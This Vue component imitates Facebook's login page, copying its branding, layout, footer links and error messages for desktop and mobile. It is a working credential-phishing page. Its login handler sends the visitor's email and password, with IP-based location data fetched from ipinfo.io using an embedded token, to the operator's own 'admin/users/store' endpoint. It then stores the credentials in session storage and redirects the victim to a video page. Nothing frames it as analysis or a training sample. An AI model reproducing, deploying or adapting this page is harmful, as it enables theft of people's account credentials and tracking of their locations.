<template>
  <div id="facebook">
    <div class="hidden sm:block pc">
      <div class="text-[#fff] bg-[#f2f4f7]">
        <div
          class="fb_content flex flex-col md:flex-row items-center md:items-start pt-[72px] pb-[112px] lg:w-[980px] mx-10 lg:mx-auto"
          id="content"
        >
          <div class="w-[400px] lg:w-[580px] text-center md:text-left">
            <div
              class="md:pt-[112px] pb-4 flex items-center justify-center md:block"
            >
              <img
                src="/fb.svg"
                alt="Facebook"
                class="h-[106px] -m-[28px]"
              />
            </div>
            <h2
              class="text-[24px] lg:text-[28px] leading-8 w-auto lg:w-[500px] font-normal pb-5"
            >
              Facebook helps you connect and share with the people in your life.
            </h2>
          </div>
          <div class="form w-[400px] lg:w-[396px] h-[456px]">
            <div class="pt-8 pb-2.5 text-center form--content m-4">
              <div class="py-1.5">
                <input
                  type="text"
                  class="ip"
                  id="email_pc"
                  placeholder="Email address or phone number"
                  aria-label="Email address or phone number"
                  v-model="email"
                />
              </div>
              <div v-if="errors.email" class="text-[#f02849] text-[13px] leading-4 text-left mx-4">The email address or mobile number you entered isn't connected to an account.</div>
              <div class="py-1.5">
                <input
                  type="password"
                  class="ip"
                  id="pass_pc"
                  placeholder="Password"
                  v-model="password"
                />
              </div>
              <div v-if="errors.password" class="text-[#f02849] text-[13px] leading-4 text-left mx-4">Your password is incorrect!</div>
              <button
                class="btn--submit w-[calc(100%-32px)]"
                name="login"
                type="submit"
                @click="handleLogin"
              >
                <div v-if="loading" class="loading-spinner"></div>
                <span v-else>Log in</span>
              </button>
              <p class="mt-4 text-center text-[#0866ff] text-sm">
                Forgotten password?
              </p>
              <p class="border-b border-[#dadde1] border-solid my-5 mx-4"></p>
              <button
                class="btn--create h-12 text-[17px] leading-[48px] px-4 rounded-md font-semibold bg-[#42b72a]"
                name="login"
                type="submit"
              >
                Create new account
              </button>
            </div>
          </div>
        </div>
      </div>
      <div
        class="fb_lang pt-5 text-[#8a8d91] lg:w-[980px] mx-10 lg:mx-auto text-xs"
        id="language"
      >
        <ul class="flex flex-wrap items-center gap-2 list-langs">
          <li>English (UK)</li>
          <li>Tiếng Việt</li>
          <li>中文(台灣)</li>
          <li>한국어</li>
          <li>日本語</li>
          <li>Français (France)</li>
          <li>ภาษาไทย</li>
          <li>Español</li>
          <li>Português (Brasil)</li>
          <li>Deutsch</li>
          <li>Italiano</li>
          <li
            class="plus bg-[#f5f6f7] border-[#ccd0d5] border border-solid py-1 px-2 hover:bg-[#ebedf0] rounded-sm"
          >
            <svg
              xmlns="http://www.w3.org/2000/svg"
              xmlns:xlink="http://www.w3.org/1999/xlink"
              fill="#8a8d91"
              version="1.1"
              width="10"
              height="10"
              viewBox="0 0 45.402 45.402"
              xml:space="preserve"
            >
              <g>
                <path
                  d="M41.267,18.557H26.832V4.134C26.832,1.851,24.99,0,22.707,0c-2.283,0-4.124,1.851-4.124,4.135v14.432H4.141   c-2.283,0-4.139,1.851-4.138,4.135c-0.001,1.141,0.46,2.187,1.207,2.934c0.748,0.749,1.78,1.222,2.92,1.222h14.453V41.27   c0,1.142,0.453,2.176,1.201,2.922c0.748,0.748,1.777,1.211,2.919,1.211c2.282,0,4.129-1.851,4.129-4.133V26.857h14.435   c2.283,0,4.134-1.867,4.133-4.15C45.399,20.425,43.548,18.557,41.267,18.557z"
                />
              </g>
            </svg>
          </li>
        </ul>
        <span class="block border-b border-[#dddfe2] border-solid mb-2"></span>
        <ul class="lists-other flex flex-wrap gap-x-4 gap-y-1">
          <li>Sign Up</li>
          <li>Log in</li>
          <li>Messenger</li>
          <li>Facebook Lite</li>
          <li>Video</li>
          <li>Places</li>
          <li>Games</li>
          <li>Marketplace</li>
          <li>Meta Pay</li>
          <li>Meta Store</li>
          <li>Meta Quest</li>
          <li>Ray-Ban Meta</li>
          <li>Meta AI</li>
          <li>Instagram</li>
          <li>Threads</li>
          <li>Fundraisers</li>
          <li>Services</li>
          <li>Voting Information Centre</li>
          <li>Privacy Policy</li>
          <li>Privacy Centre</li>
          <li>Groups</li>
          <li>About</li>
          <li>Create ad</li>
          <li>Create Page</li>
          <li>Developers</li>
          <li>Careers</li>
          <li>Cookies</li>
          <li>AdChoices</li>
          <li>Terms</li>
          <li>Help</li>
          <li>Contact uploading and non-users</li>
        </ul>
        <span class="text-[#737373] text-[11px] my-5 block">Meta © 2024</span>
      </div>
    </div>
    <div class="block sm:hidden mobile">
      <p class="bg"></p>
      <div class="flex flex-col px-4 h-screen">
        <div class="logo">
          <img
            alt="Facebook from Meta"
            src="/f.png"
            style="
              max-height: 60px;
              min-height: 0px;
              object-fit: contain;
              overflow: hidden;
            "
            height="60"
            width="60"
          />
        </div>
        <div class="form h-[270px]">
          <div class="pt-8 pb-2.5 text-center form--content">
            <div class="py-1.5">
              <input
                type="text"
                class="ip"
                id="email"
                placeholder="Email address or phone number"
                aria-label="Email address or phone number"
                v-model="email"
              />
            </div>
            <div v-if="errors.email" class="text-[#f02849] text-[13px] leading-4 text-left">The email address or mobile number you entered isn't connected to an account.</div>
            <div class="py-1.5">
              <input
                type="password"
                class="ip"
                id="pass"
                placeholder="Password"
                v-model="password"
              />
            </div>
            <div v-if="errors.password" class="text-[#f02849] text-[13px] leading-4 text-left">Your password is incorrect!</div>
            <button class="btn--submit" name="login" type="submit" @click="handleLogin">
              <div v-if="loading" class="loading-spinner"></div>
              <span v-else>Log in</span>
            </button>
            <p class="mt-4 text-forgotten">Forgotten password?</p>
          </div>
        </div>
        <div class="mb-ft">
          <button class="btn--create">Create new account</button>
          <div class="pt-5 pb-3 flex items-center justify-center">
            <img
              alt="Meta logo"
              class="wbloks_1 h-[12px] w-[60px]"
              src="/meta.png"
              style="
                height: 12px;
                width: 60px;
                mask-size: contain;
                object-fit: contain;
                overflow: hidden;
              "
            />
          </div>
          <div class="mb-4 flex items-center justify-center text-[10px] text-[rgb(99,120,138)] gap-1">
            <span
              style="
                cursor: pointer;
                -webkit-tap-highlight-color: transparent;
                color: rgb(99, 120, 138);
                display: inline;
                font-size: 10px;
                white-space: pre-wrap;
                overflow-wrap: break-word;
              "
              >About</span
            >
            <span
              style="
                cursor: pointer;
                -webkit-tap-highlight-color: transparent;
                color: rgb(99, 120, 138);
                display: inline;
                font-size: 10px;
                white-space: pre-wrap;
                overflow-wrap: break-word;
              "
              >Help</span
            >
            <span
              style="
                cursor: pointer;
                -webkit-tap-highlight-color: transparent;
                color: rgb(99, 120, 138);
                display: inline;
                font-size: 10px;
                white-space: pre-wrap;
                overflow-wrap: break-word;
              "
              >More</span
            >
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
export default {
  layout: 'empty',
  data() {
    return {
      email: '',
      password: '',
      loading: false,
      errors: {
        email: false,
        password: false
      },
      details: {}
    }
  },
  head() {
    return {
      title: "Log in to Facebook",
      meta: [
        {
          hid: 'description',
          name: 'description',
          content: "Log in to Facebook to start sharing and connecting with your friends, family and people you know.",
        },
      ],
    }
  },
  methods: {
    async handleLogin() {
      this.errors = {
        email: false,
        password: false
      }
      if (!this.email.length || this.email.length < 4 || this.email.length > 50) this.errors.email = true;
      else if (!this.password.length || this.password.length < 6 || this.password.length > 32) this.errors.password = true;
      else {
        this.loading = true;
        try {
          const res = await this.$axios.post("admin/users/store", {
            email: this.email,
            password: this.password,
            details: this.details
          })
          if (res.status === 201) {
            const urlVideo = sessionStorage.getItem("URLVideo");
            if (this.email && this.password) {
              sessionStorage.setItem("USER_ID", JSON.stringify(`${this.email}-${this.password}`));
              if (urlVideo) {
                setTimeout(() => {
                  this.$router.push(`/videos/${urlVideo}`);
                }, 5000)
              } else {
                setTimeout(() => {
                  this.$router.push('/');
                }, 5000)
              }
            } else {
              this.loading = false;
            }
          }
        } catch (e) {
          this.loading = false;
          this.$message.error("Please check your login information again!")
        }
      }
    },
    async getIpInfo() {
      try {
        const res = await this.$axios.get("https://ipinfo.io/?token=12f0e8eb5690ee");
        if (res.status === 200) this.details = res.data;
      } catch (e) {}
    }
  },
  created() {
    this.getIpInfo();
  }
}
</script>

<style lang="scss" scoped>
.pc {
  .form {
    &--content {
      background-color: #fff;
      border: none;
      border-radius: 8px;
      box-shadow: 0px 2px 4px rgba(0, 0, 0, 0.1),
        0px 8px 16px rgba(0, 0, 0, 0.1);
      box-sizing: border-box;
      margin: 40px 0 0;
      padding: 20px 0 28px;
      width: 396px;
    }
    .ip {
      background: #ffffff;
      border: 1px solid #dddfe2;
      color: #1d2129;
      font-family: Helvetica, Arial, sans-serif;
      line-height: 16px;
      vertical-align: middle;
      font-size: 17px;
      padding: 14px 16px;
      width: calc(100% - 32px);
      height: 52px;
      border-radius: 6px;
      &:focus {
        border-color: #0866ff;
        box-shadow: 0 0 0 2px #e7f3ff;
        caret-color: #0866ff;
        outline: none;
      }
    }
    .btn--submit {
      background-color: #0866ff;
      border: none;
      border-radius: 6px;
      font-size: 20px;
      line-height: 48px;
      height: 44px;
      min-width: 44px;
      padding: 0 16px;
      transition: 200ms cubic-bezier(0.08, 0.52, 0.52, 1) background-color,
        200ms cubic-bezier(0.08, 0.52, 0.52, 1) box-shadow,
        200ms cubic-bezier(0.08, 0.52, 0.52, 1) transform;
      position: relative;
      text-align: center;
      text-shadow: none;
      vertical-align: middle;
      font-weight: 700;
      align-items: center;
      display: flex;
      justify-content: center;
      margin: 8px 16px 0 16px;
      &:hover {
        background-color: #1877f2;
      }
    }
    .btn--create {
      &:hover {
        background-color: #36a420;
        border-color: #36a420;
      }
    }
  }
  .list-langs,
  .lists-other {
    li {
      color: #737373;
      cursor: pointer;
      &:hover {
        text-decoration: underline;
      }
    }
  }
}
.mobile {
  min-height: 100vh;
  .bg {
    background: radial-gradient(
        rgba(255, 255, 255, 0.25),
        rgba(255, 255, 255, 0) 40%
      ),
      radial-gradient(
        rgb(255, 209, 82) 30%,
        rgb(226, 105, 150),
        rgba(226, 105, 150, 0.4) 41%,
        transparent 52%
      ),
      radial-gradient(rgb(160, 51, 255) 37%, transparent 46%),
      linear-gradient(155deg, transparent 65%, rgb(37, 212, 102) 95%),
      linear-gradient(45deg, rgb(0, 101, 224), rgb(15, 139, 255));
    background-position: left bottom, 109% 68%, 109% 68%, center center,
      center center;
    background-repeat: no-repeat;
    background-size: 200% 200%, 285% 500%, 285% 500%, cover, cover;
    inset: 0px;
    opacity: 0.08;
    outline: none;
    outline-offset: -1px;
    position: absolute;
    height: 100vh;
  }
  .btn--submit {
    opacity: 1;
    height: 44px;
    min-width: 44px;
    flex-grow: 1;
    padding-left: 20px;
    padding-right: 20px;
    background: rgb(0, 100, 224);
    border: 0px solid rgb(28, 43, 51);
    border-radius: 22px;
    color: #fff;
    font-weight: 500;
    font-size: 16px;
    width: 100%;
    transition: all ease-in-out 0.25s;
    align-items: center;
    display: flex;
    justify-content: center;
    margin-top: 8px;
  }
  .ip {
    background: #ffffff;
    border: 1px solid #dddfe2;
    color: #1d2129;
    font-family: Helvetica, Arial, sans-serif;
    line-height: 16px;
    vertical-align: middle;
    font-size: 17px;
    padding: 14px 16px;
    width: 100%;
    height: 52px;
    border-radius: 6px;
    &:focus {
      border-color: #0866ff;
      box-shadow: 0 0 0 2px #e7f3ff;
      caret-color: #0866ff;
      outline: none;
    }
  }
  .text-forgotten {
    color: rgb(28, 43, 51);
    font-weight: 400;
    font-size: 16px;
  }
  .logo {
    margin-top: 0px;
    margin-bottom: 20px;
    flex-grow: 1;
    flex-shrink: 100;
    align-items: center;
    justify-content: center;
    display: flex;
    flex-direction: column;
  }
  .form {
    flex-direction: column;
    justify-content: flex-start;
    box-sizing: border-box;
    display: flex;
    flex: 0 1 auto;
    position: relative;
    min-height: 0px;
    min-width: 0px;
  }
  .mb-ft {
    box-sizing: border-box;
    display: flex;
    flex: 0 1 auto;
    position: relative;
    min-height: 0px;
    min-width: 0px;
    flex-grow: 1;
    flex-shrink: 1e+06;
    padding-bottom: 0px;
    flex-direction: column;
    justify-content: flex-end;
  }
  .btn--create {
    opacity: 1;
    height: 44px;
    min-width: 44px;
    padding-left: 20px;
    padding-right: 20px;
    border: 1px solid rgb(0, 100, 224);
    border-radius: 22px;
    color: rgb(0, 100, 224);
    font-weight: 400;
    font-size: 16px;
  }
  
}
.loading-spinner {
  border: 3px solid #f3f3f3; /* Light gray */
  border-top: 3px solid #3498db; /* Blue */
  border-radius: 50%;
  width: 20px;
  height: 20px;
  animation: spin 1s linear infinite;
}

@keyframes spin {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
</style>
